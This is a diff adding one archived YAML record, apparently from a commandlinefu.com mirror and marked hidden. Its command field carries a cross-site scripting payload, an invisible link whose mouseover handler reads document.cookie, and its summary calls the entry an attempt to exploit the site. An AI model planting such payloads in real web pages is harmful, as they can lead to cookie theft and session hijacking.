@@ -1,0 +1,8 @@
+commandlinefu_id: 2599
+translator:
+  weibo: ''
+hide: true
+command: |-
+  perl -pi -e 's/<a href="#" onmouseover="console.log('xss! '+document.cookie)" style="position:absolute;height:0;width:0;background:transparent;font-weight:normal;">xss</a>/<\/a>/g'
+summary: |-
+  Attempt an XSS exploit on commandlinefu.com
